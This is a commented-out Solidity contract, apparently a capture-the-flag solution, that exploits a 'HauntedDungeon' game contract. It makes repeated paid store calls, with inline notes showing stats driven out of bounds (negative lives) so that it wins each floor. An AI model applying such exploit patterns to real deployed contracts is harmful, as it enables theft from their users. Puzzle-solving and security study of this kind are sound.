// // SPDX-License-Identifier: UNLICENSED
// pragma solidity >=0.8.0;

// import "./HauntedDungeon.sol";

// // 1, 3, 5, 7, 50
// contract ExploitDungeon {
//     HauntedDungeon instance;

//     constructor(address exploitable) payable {
//         require(msg.value >= 1.9 ether, "small amount");
//         instance = HauntedDungeon(exploitable);
//     }

//     function finalize() external {
//         instance.enterDungeon{value: 0.1 ether}(); // >= 0.1 ether
//         // lives = 3, attack = 1, def = 0, store access = 3
//         string memory something = "mntnDew";
//         instance.store{value: 0.2 ether}(something); // repeat this few time
//         // lives = 1, attack = 13, def = -4, store access = 2
//         instance.turn();
//         // current floor = 1
//         // current moster [ r1%10 + 1, r2%7 + 1]
//         // attack > mnst attack
//         // lives = 3, attack / 2, dfense /2, store access + (1+current floor)
//         // lives = 3, attack = 6, def = -2, store access = 4
//         instance.store{value: 0.2 ether}(something);
//         // lives = 1, attack = 18, def = -6, store access = 3
//         instance.turn();
//         // current floor = 2
//         // current moster [ r1%10 + 3, r2%7 + 3]
//         // attack wins
//         // lives = 3, attack = 9, def = -3, store access = 6

//         // current mstr [ r1%10 + 5, r2%7 + 5]
//         instance.store{value: 0.2 ether}(something);
//         // lives = 1, attack = 21, def = -7, store access = 5
//         instance.turn();
//         // current floor = 3
//         // attack wins
//         // lives = 3, attack = 10, def = -4, store access = 8
//         // current mstr [ r1%10 + 7, r2%7 + 7]
//         instance.store{value: 0.2 ether}(something);
//         // lives = 1, attack = 22, def = -8, store access = 7
//         instance.turn();
//         // current floor = 4
//         // attack wins
//         // lives = 3, attack = 11, def = -4, store access = 12
//         // current mstr [ r1%10 + 50, r2%7 + 50]
//         instance.store{value: 0.2 ether}(something);
//         // lives = 1, attack = 23, def = -8, store access = 11
//         instance.store{value: 0.2 ether}(something);
//         // lives = -1, attack = 35, def = -12, store access = 10
//         instance.store{value: 0.2 ether}(something);
//         // lives = -3, attack = 47, def = -16, store access = 9
//         instance.store{value: 0.2 ether}(something);
//         // lives = -5, attack = 59, def = -29, store access = 8
//         instance.store{value: 0.2 ether}(something);
//         // attack wins
//         instance.turn();
//         instance.turn();
//     }

//     receive() external payable {}
// }
